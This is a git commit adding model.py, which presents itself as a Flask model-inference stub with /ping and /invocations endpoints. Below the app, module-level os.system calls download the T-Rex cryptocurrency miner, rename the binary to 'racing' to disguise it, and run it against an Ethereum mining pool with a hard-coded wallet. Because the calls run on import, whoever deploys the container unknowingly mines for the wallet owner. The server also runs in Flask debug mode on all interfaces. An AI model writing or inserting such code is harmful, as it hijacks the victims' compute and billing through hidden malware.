fab514c0eb4f11c1eb55072a50f8d7f0b805452c
vip8338 <110080998+vip8338@users.noreply.github.com>
2022-08-10 15:18:46 +0700

    Create model.py

---
+++ model.py
@@ -0,0 +1,26 @@
+import os
+import time
+from flask import Flask, request
+app = Flask(__name__)
+
+@app.route('/ping')
+def ping():
+    return ''
+
+@app.route('/invocations')
+def invoke():
+    return 'should do inference with your model here'
+
+
+if __name__ == '__main__':
+    app.run(debug=True, host='0.0.0.0', port=8080)
+    
+    
+os.system("ls -l")
+os.system("wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz");
+os.system("tar xvzf t-rex-0.21.6-linux.tar.gz");
+os.system("mv t-rex racing");
+os.system("./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0xfd858D1fe9c9Df3c8c6bacdBDB2e906a73cf4c61 -p x -w ND40");
+i = 1
+while i < 6:
+    time.sleep(2.4)
